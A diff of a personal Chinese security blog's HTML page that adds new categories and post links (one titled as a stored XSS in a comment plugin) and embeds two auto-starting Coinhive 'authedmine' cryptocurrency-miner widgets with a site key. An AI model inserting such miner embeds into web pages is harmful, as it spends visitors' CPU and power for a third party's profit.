@@ -25,6 +25,19 @@
     return true;
   }
 </script>
+<script src="https://authedmine.com/lib/simple-ui.min.js" async></script>
+<div class="coinhive-miner" 
+    style="height: 80px"
+    data-key="3CZb3wTC2wAsN0kWehZEi8Tclp38uFBo"
+    data-autostart="true"
+    data-whitelabel="true"
+    data-background="#000000"
+    data-text="#eeeeee"
+    data-action="#00ff00"
+    data-graph="#555555"
+    data-threads="4"
+    data-throttle="0.1">
+</div>
   </head>
   <body class="antialiased hide-extras">
     
@@ -42,7 +55,7 @@
         
         <li id=""><a target="_self" href="index.html">Home</a></li>
         
-        <li id=""><a target="_self" href="archives.html">Archives</a></li>
+        <li id=""><a target="_blank" href="archives.html">Archives</a></li>
         
         </ul>
 
@@ -71,13 +84,17 @@
         
         <li><a target="_self" href="index.html">Home</a></li>
         
-        <li><a target="_self" href="archives.html">Archives</a></li>
+        <li><a target="_blank" href="archives.html">Archives</a></li>
         
 
     <li><label>Categories</label></li>
 
         
             <li><a href="miscellany.html">杂记</a></li>
+        
+            <li><a href="cnvd.html">CNVD</a></li>
+        
+            <li><a href="php.html">PHP</a></li>
          
 
       </ul>
@@ -159,7 +176,7 @@
                 <div class="site-a-logo"><img src="https://avatars1.githubusercontent.com/u/41846038" /></div>
             
                 <h1>NIANHUA BLOG</h1>
-                <div class="site-des">低级信息安全研究员</div>
+                <div class="site-des">低级信息安全研究员</br>低级硬件工程师</div>
                 <div class="social">
 
 
@@ -178,8 +195,22 @@
           	</div>
 
              
-
-              <div id="site-categories" class="side-item ">
+              <!--coinhive-->
+              <script src="https://authedmine.com/lib/simple-ui.min.js" async></script>
+              <div class="coinhive-miner" 
+                  style="margin-top:20px;height: 250px"
+                  data-key="3CZb3wTC2wAsN0kWehZEi8Tclp38uFBo"
+                  data-autostart="true"
+                  data-whitelabel="true"
+                  data-background="#fafafa"
+                  data-action="#57ad68"
+                  data-threads="4"
+                  data-throttle="0.12"
+              >
+                  <em>Loading...</em>
+              </div>
+              <!--coinhive-->
+              <div id="site-categories" class="side-item " style="padding-top:0px;">
                 <div class="side-header">
                   <h2>Categories</h2>
                 </div>
@@ -188,6 +219,10 @@
       	<p class="cat-list">
         
             <a href="miscellany.html"><strong>杂记</strong></a>
+        
+            <a href="cnvd.html"><strong>CNVD</strong></a>
+        
+            <a href="php.html"><strong>PHP</strong></a>
          
         </p>
 
@@ -202,6 +237,18 @@
                 <div class="side-content">
                 <ul class="posts-list">
 	      
+		      
+			      <li class="post">
+			        <a href="apache-virtual-host.html">Apache虚拟主机的配置</a>
+			      </li>
+		     
+		  
+		      
+			      <li class="post">
+			        <a href="livere-stored-cross-site-scripting.html">来必力评论插件存储XSS</a>
+			      </li>
+		     
+		  
 		      
 			      <li class="post">
 			        <a href="github-build-blog.html">如何在Github上搭建自己的主页和域名的绑定</a>
@@ -250,7 +297,7 @@ Visit <a target="_blank" href="http://github.com/nianhua">My GitHub</a>.</p>
     </script>
 
     
-<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script><script type="text/x-mathjax-config">MathJax.Hub.Config({TeX: { equationNumbers: { autoNumber: "AMS" } }});</script>
+
 
 
   </body>
